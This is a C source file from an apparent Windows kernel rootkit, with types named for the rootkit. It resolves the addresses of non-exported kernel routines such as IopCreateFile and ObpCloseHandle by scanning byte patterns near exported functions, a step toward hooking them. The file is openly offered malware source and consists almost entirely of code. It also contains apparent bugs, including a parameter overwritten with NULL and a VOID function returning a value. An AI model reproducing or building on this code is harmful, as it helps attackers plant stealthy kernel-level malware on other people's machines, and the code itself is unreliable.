#include "common.h"


/*////////////////////////////////////////////////////////////
//	File: non_exported_procedures.c
//
//	Non exported routines addresses loaded
//	with GetInternalOsFunctionAddressByOffsetAndFunctionName
//
//
*/////////////////////////////////////////////////////////////

IOCREATEFILE IoCreateFileOriginal = NULL;
IOPCREATEFILE MyIopCreateFile = NULL;
OBCLOSEHANDLE ObCloseHandleOriginal = NULL;
OBPCLOSEHANDLE ObpCloseHandle = NULL;

UINT_PTR GetInternalOsFunctionAddressByOffsetAndFunctionName(
	IN PVOID FunctionAddress,
	IN PCWSTR FunctionName,
	IN UINT8 FirstOffset,
	IN UINT8 SecondOffset,
	IN OPTIONAL UINT8 ThirdOffset,
	IN PROOTKIT_API_HASH Hash)
{
	UNICODE_STRING func = { 0 };

	FunctionAddress = NULL;
	Hash->_RtlInitUnicodeString(&func, FunctionName);

	FunctionAddress = (PVOID)Hash->_MmGetSystemRoutineAddress(&func);
	if (FunctionAddress && Hash->_MmIsAddressValid(&func))
	{

		__try
		{

			PUINT8 i = NULL;
			PUINT8 StartScannerAddress = (PUINT8)FunctionAddress;
			PUINT8 EndScannerAddress = StartScannerAddress + 0x500;
			UINT8 value1 = 0, value2 = 0, value3 = 0;
#ifndef _WIN64
			INT32 offset = 0;
#else
			INT64 offset = 0;
#endif _WIN64
			for (i = StartScannerAddress; i < EndScannerAddress; ++i)
			{
				if (ARGUMENT_PRESENT(ThirdOffset))
				{

					if (Hash->_MmIsAddressValid(i) && Hash->_MmIsAddressValid(i + 1) && Hash->_MmIsAddressValid(i + 7))
					{

						value1 = *i;
						value2 = *(i + 1);
						value3 = *(i + 7);
						if (value1 == FirstOffset && value2 == SecondOffset && value3 == ThirdOffset)
						{
							kimemcpy(&offset, i + 3, 4);
#ifndef _WIN64
							return(UINT_PTR)(offset + (UINT32)i + 5);
#else
							return(UINT_PTR)(offset + (UINT64)i + 7);
#endif _WIN64
						}

					}
				}
				else
				{

					value1 = *i;
					value2 = *(i + 5);
					if (value1 == FirstOffset && value2 == SecondOffset)
					{
						kimemcpy(&offset, i + 1, 4);
#ifndef _WIN64
						return(UINT_PTR)(offset + (UINT32)i + 5);
#else
						return(UINT_PTR)(offset + (UINT64)i + 5);
#endif _WIN64
					}
				}
			}

		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return GetExceptionCode();
		}
	}

	return 0;
}

VOID KiLoadNonExportedRoutines(IN PVOID Context)
{
	PROOTKIT_API_HASH Hash = NULL;
	Hash = (PROOTKIT_API_HASH)Context;

	__try
	{
		MyIopCreateFile = (IOPCREATEFILE)GetInternalOsFunctionAddressByOffsetAndFunctionName(IoCreateFileOriginal,
			L"IoCreateFile",
			g_rootkit_dynamic_data.IopCreateFile_First_Offset,
			g_rootkit_dynamic_data.IopCreateFile_Second_Offset,
			NULL,
			Hash);
		if (MyIopCreateFile && Hash->_MmIsAddressValid(MyIopCreateFile))
		{
			KdPrint(("\r\nIopCreateFile address resolved"));
		}

		ObpCloseHandle = (OBPCLOSEHANDLE)GetInternalOsFunctionAddressByOffsetAndFunctionName(ObCloseHandleOriginal,
			L"ObCloseHandle", 
			g_rootkit_dynamic_data.ObpCloseHandle_1_Offset, 
			g_rootkit_dynamic_data.ObpCloseHandle_2_Offset,
			NULL,
			Hash);
		if (ObpCloseHandle && Hash->_MmIsAddressValid(ObpCloseHandle))
		{
			KdPrint(("\r\nObpCloseHandle address resolved"));
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return GetExceptionCode();
	}

	Hash->_PsTerminateSystemThread(STATUS_SUCCESS);
}